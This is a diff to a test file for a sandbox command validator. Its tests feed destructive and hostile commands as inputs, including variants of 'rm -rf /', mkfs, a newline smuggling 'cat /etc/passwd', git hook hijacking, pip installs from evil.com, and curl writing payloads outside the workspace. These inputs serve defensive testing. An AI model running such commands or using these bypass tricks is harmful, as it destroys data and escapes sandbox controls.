@@ -9,8 +9,8 @@ import {
 } from '../security';
 
 const baseConfig: SandboxConfig = {
-  allowedCommands: ['bash', 'sh', 'git', 'ls', 'cat', 'echo', 'python3', 'node'],
-  deniedPatterns: ['rm -rf /', 'mkfs', 'dd if='],
+  allowedCommands: ['git', 'ls', 'cat', 'echo', 'python3', 'node', 'find', 'pip', 'curl', 'bun'],
+  deniedPatterns: ['\\brm\\s+(-\\w+\\s+)*\\/', '\\bmkfs\\b', '\\bdd\\b.*\\bif='],
   maxExecutionTimeS: 60,
   maxWorkspaceSizeMb: 256,
   networkAccess: true,
@@ -79,18 +79,65 @@ describe('SandboxCommandValidator', () => {
 
   describe('denied patterns', () => {
     test('blocks rm -rf /', () => {
-      const result = validator.validateCommand('bash rm -rf /');
+      // Use a config that includes rm to test denied patterns specifically
+      const rmConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
+      };
+      const rmValidator = new SandboxCommandValidator(rmConfig);
+      const result = rmValidator.validateCommand('rm -rf /');
       expect(result.valid).toBe(false);
       if (!result.valid) expect(result.reason).toContain('denied pattern');
     });
 
-    test('blocks mkfs', () => {
-      const result = validator.validateCommand('bash mkfs.ext4 /dev/sda1');
+    test('blocks rm -r -f / (flag reordering)', () => {
+      const rmConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
+      };
+      const rmValidator = new SandboxCommandValidator(rmConfig);
+      const result = rmValidator.validateCommand('rm -r -f /');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('denied pattern');
+    });
+
+    test('blocks rm -rf /*', () => {
+      const rmConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
+      };
+      const rmValidator = new SandboxCommandValidator(rmConfig);
+      const result = rmValidator.validateCommand('rm -rf /*');
       expect(result.valid).toBe(false);
     });
 
-    test('blocks dd if=', () => {
-      const result = validator.validateCommand('bash dd if=/dev/zero of=/dev/sda');
+    test('blocks rm -fr /', () => {
+      const rmConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
+      };
+      const rmValidator = new SandboxCommandValidator(rmConfig);
+      const result = rmValidator.validateCommand('rm -fr /');
+      expect(result.valid).toBe(false);
+    });
+
+    test('allows rm file.txt (not matching denied pattern)', () => {
+      const rmConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
+      };
+      const rmValidator = new SandboxCommandValidator(rmConfig);
+      const result = rmValidator.validateCommand('rm file.txt');
+      expect(result.valid).toBe(true);
+    });
+
+    test('blocks mkfs', () => {
+      const mkfsConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'mkfs.ext4'],
+      };
+      const mkfsValidator = new SandboxCommandValidator(mkfsConfig);
+      const result = mkfsValidator.validateCommand('mkfs.ext4 /dev/sda1');
       expect(result.valid).toBe(false);
     });
   });
@@ -109,6 +156,259 @@ describe('SandboxCommandValidator', () => {
 
     test('handles commands with paths', () => {
       expect(validator.validateCommand('/usr/bin/git status')).toEqual({ valid: true });
+    });
+  });
+
+  describe('shell binary rejection', () => {
+    test('rejects bash (not in default allowlist)', () => {
+      const result = validator.validateCommand('bash -c "dangerous"');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('not in the allowed list');
+    });
+
+    test('rejects sh (not in default allowlist)', () => {
+      const result = validator.validateCommand('sh -c "dangerous"');
+      expect(result.valid).toBe(false);
+    });
+
+    test('rejects /bin/bash with full path', () => {
+      const result = validator.validateCommand('/bin/bash -c "dangerous"');
+      expect(result.valid).toBe(false);
+    });
+  });
+
+  describe('shell interpreter warning', () => {
+    test('emits warning when bash is in custom allowlist', () => {
+      // The warning is logged in the constructor; this test verifies construction succeeds.
+      const warnConfig: SandboxConfig = {
+        ...baseConfig,
+        allowedCommands: [...baseConfig.allowedCommands, 'bash'],
+      };
+      const warnValidator = new SandboxCommandValidator(warnConfig);
+      // bash -c is allowed here only because an admin explicitly added bash to the allowlist.
+      const result = warnValidator.validateCommand('bash -c "test"');
+      expect(result.valid).toBe(true);
+    });
+  });
+
+  describe('backward compatibility', () => {
+    test('allows ls -la', () => {
+      expect(validator.validateCommand('ls -la')).toEqual({ valid: true });
+    });
+
+    test('allows git status', () => {
+      expect(validator.validateCommand('git status')).toEqual({ valid: true });
+    });
+
+    test('allows cat file.txt', () => {
+      expect(validator.validateCommand('cat file.txt')).toEqual({ valid: true });
+    });
+
+    test('allows echo hello', () => {
+      expect(validator.validateCommand('echo hello')).toEqual({ valid: true });
+    });
+
+    test('allows node script.js', () => {
+      expect(validator.validateCommand('node script.js')).toEqual({ valid: true });
+    });
+
+    test('allows python3 script.py', () => {
+      expect(validator.validateCommand('python3 script.py')).toEqual({ valid: true });
+    });
+
+    test('allows git clone url', () => {
+      expect(validator.validateCommand('git clone https://github.com/org/repo.git')).toEqual({
+        valid: true,
+      });
+    });
+  });
+
+  describe('newline and null byte bypass', () => {
+    test('rejects commands with newline', () => {
+      const result = validator.validateCommand('ls\ncat /etc/passwd');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('metacharacters');
+    });
+
+    test('rejects commands with carriage return', () => {
+      const result = validator.validateCommand('ls\rcat /etc/passwd');
+      expect(result.valid).toBe(false);
+    });
+
+    test('rejects commands with null byte', () => {
+      const result = validator.validateCommand('ls\0cat /etc/passwd');
+      expect(result.valid).toBe(false);
+    });
+  });
+
+  describe('eval flags allowed (sandbox is the security boundary)', () => {
+    test('allows node -e (sandbox provides isolation)', () => {
+      expect(validator.validateCommand('node -e "code"')).toEqual({ valid: true });
+    });
+
+    test('allows python3 -c (sandbox provides isolation)', () => {
+      expect(validator.validateCommand('python3 -c "code"')).toEqual({ valid: true });
+    });
+
+    test('allows bun -e (sandbox provides isolation)', () => {
+      expect(validator.validateCommand('bun -e "code"')).toEqual({ valid: true });
+    });
+
+    test('allows node --eval=code', () => {
+      expect(validator.validateCommand('node --eval=code')).toEqual({ valid: true });
+    });
+
+    test('allows node script.js', () => {
+      expect(validator.validateCommand('node script.js')).toEqual({ valid: true });
+    });
+
+    test('allows python3 script.py', () => {
+      expect(validator.validateCommand('python3 script.py')).toEqual({ valid: true });
+    });
+  });
+
+  describe('per-binary dangerous args (destructive only)', () => {
+    test('allows find -exec (sandbox limits blast radius)', () => {
+      expect(validator.validateCommand('find . -exec grep TODO {}')).toEqual({ valid: true });
+    });
+
+    test('allows find -execdir (sandbox limits blast radius)', () => {
+      expect(validator.validateCommand('find . -execdir chmod 644 {}')).toEqual({ valid: true });
+    });
+
+    test('blocks find -delete (destructive mass deletion)', () => {
+      const result = validator.validateCommand('find . -delete');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('deletion');
+    });
+
+    test('allows find -name', () => {
+      expect(validator.validateCommand('find . -name "*.ts"')).toEqual({ valid: true });
+    });
+
+    test('blocks find "-delete" with quoted arg (quoting bypass)', () => {
+      const result = validator.validateCommand('find . "-delete"');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('deletion');
+    });
+
+    test('blocks git -c core.hooksPath (stealth code execution)', () => {
+      const result = validator.validateCommand('git -c core.hooksPath=/evil pull');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('hooks');
+    });
+
+    test('blocks git -c core.sshCommand (stealth code execution)', () => {
+      const result = validator.validateCommand('git -c core.sshCommand=evil fetch');
+      expect(result.valid).toBe(false);
+    });
+
+    test('blocks git -ccore.hooksPath concatenated form', () => {
+      const result = validator.validateCommand('git -ccore.hooksPath=/evil pull');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('hooks');
+    });
+
+    test('blocks git -c core.hookspath case-insensitive', () => {
+      const result = validator.validateCommand('git -c core.hookspath=/evil pull');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('hooks');
+    });
+
+    test('allows git clone', () => {
+      expect(validator.validateCommand('git clone https://example.com/repo.git')).toEqual({
+        valid: true,
+      });
+    });
+
+    test('allows git status', () => {
+      expect(validator.validateCommand('git status')).toEqual({ valid: true });
+    });
+
+    test('allows pip install from PyPI (normal workflow)', () => {
+      expect(validator.validateCommand('pip install flask')).toEqual({ valid: true });
+    });
+
+    test('allows pip install with version pin', () => {
+      expect(validator.validateCommand('pip install requests==2.31.0')).toEqual({ valid: true });
+    });
+
+    test('blocks pip install from URL (untrusted source)', () => {
+      const result = validator.validateCommand('pip install https://evil.com/pkg.tar.gz');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('URL');
+    });
+
+    test('blocks pip install from VCS URL (git+https://)', () => {
+      const result = validator.validateCommand('pip install git+https://github.com/evil/pkg.git');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('URL');
+    });
+
+    test('blocks pip install from file:// URL', () => {
+      const result = validator.validateCommand('pip install file:///tmp/evil-pkg');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('URL');
+    });
+
+    test('blocks pip --isolated install from URL (global opts before subcommand)', () => {
+      const result = validator.validateCommand(
+        'pip --isolated install https://evil.com/pkg.tar.gz',
+      );
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('URL');
+    });
+
+    test('blocks pip install from absolute path outside workspace', () => {
+      const result = validator.validateCommand('pip install /tmp/evil-pkg');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('outside the workspace');
+    });
+
+    test('allows pip install from workspace path', () => {
+      expect(validator.validateCommand('pip install ./')).toEqual({ valid: true });
+    });
+
+    test('allows pip --version', () => {
+      expect(validator.validateCommand('pip --version')).toEqual({ valid: true });
+    });
+
+    test('blocks curl -o to absolute path outside workspace', () => {
+      const result = validator.validateCommand('curl -o /usr/bin/payload https://evil.com');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('workspace');
+    });
+
+    test('blocks curl --output= to absolute path outside workspace', () => {
+      const result = validator.validateCommand('curl --output=/usr/bin/payload https://evil.com');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('workspace');
+    });
+
+    test('blocks curl -o /workspace/../tmp/payload (path traversal)', () => {
+      const result = validator.validateCommand(
+        'curl -o /workspace/../tmp/payload https://evil.com',
+      );
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('workspace');
+    });
+
+    test('blocks curl -o /workspace-backdoor/payload (prefix confusion)', () => {
+      const result = validator.validateCommand(
+        'curl -o /workspace-backdoor/payload https://evil.com',
+      );
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('workspace');
+    });
+
+    test('allows curl without -o', () => {
+      expect(validator.validateCommand('curl https://api.example.com')).toEqual({ valid: true });
+    });
+
+    test('destructive arg rejection includes alternative suggestion', () => {
+      const result = validator.validateCommand('find . -delete');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('instead');
     });
   });
 });
